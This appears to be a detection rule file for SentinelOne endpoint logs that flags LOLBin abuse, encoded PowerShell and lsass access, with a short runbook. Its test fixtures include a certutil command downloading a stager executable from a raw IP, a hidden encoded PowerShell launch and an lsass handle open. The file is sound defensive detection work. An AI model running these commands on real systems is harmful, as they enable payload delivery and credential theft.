AnalysisType: rule
RuleID: "EDR.SentinelOne.LOLBin.CredentialAccess"
DisplayName: "EDR — LOLBin Abuse and Credential Access"
Filename: edr_lolbin_credential_access.py
Enabled: true
Severity: High
LogTypes:
  - SentinelOne.DeepVisibilityV2
Tags:
  - EDR
  - LOLBin
  - credential-access
  - ATT&CK:T1059.001
  - ATT&CK:T1003.001
  - ATT&CK:T1218
Reports:
  MITRE ATT&CK:
    - TA0002:T1059.001
    - TA0006:T1003.001
    - TA0005:T1218
DedupPeriodMinutes: 60
Threshold: 1
Description: >
  Detects LOLBin abuse, obfuscated PowerShell execution, and cross-process
  access to lsass.exe on SentinelOne-monitored endpoints. Common precursor
  to ransomware deployment and lateral movement.
Runbook: >
  1. Identify the process and host from alert context.
  2. Review full process tree in SentinelOne console.
  3. Check if certutil/PowerShell made outbound connections.
  4. Isolate endpoint if confirmed malicious.
Tests:
  - Name: Certutil LOLBin download
    ExpectedResult: true
    Log:
      {
        "event.type": "ProcessCreation",
        "event.category": "process",
        "src.process.name": "certutil.exe",
        "src.process.cmdline": "certutil.exe -urlcache -split -f http://185.220.101.47/stager.exe",
        "endpoint.name": "WKSTN-001",
        "endpoint.os": "windows",
        "tgt.process.name": ""
      }
  - Name: PowerShell encoded command
    ExpectedResult: true
    Log:
      {
        "event.type": "ProcessCreation",
        "event.category": "process",
        "src.process.name": "powershell.exe",
        "src.process.cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgA",
        "endpoint.name": "WKSTN-001",
        "endpoint.os": "windows",
        "tgt.process.name": ""
      }
  - Name: LSASS memory access
    ExpectedResult: true
    Log:
      {
        "event.type": "Open Remote Process Handle",
        "event.category": "cross_process",
        "src.process.name": "powershell.exe",
        "src.process.cmdline": "powershell.exe -nop -w hidden",
        "endpoint.name": "WKSTN-001",
        "endpoint.os": "windows",
        "tgt.process.name": "lsass.exe"
      }
  - Name: Benign process - should not fire
    ExpectedResult: false
    Log:
      {
        "event.type": "ProcessCreation",
        "event.category": "process",
        "src.process.name": "chrome.exe",
        "src.process.cmdline": "chrome.exe --start-maximized",
        "endpoint.name": "WKSTN-001",
        "tgt.process.name": ""
      }
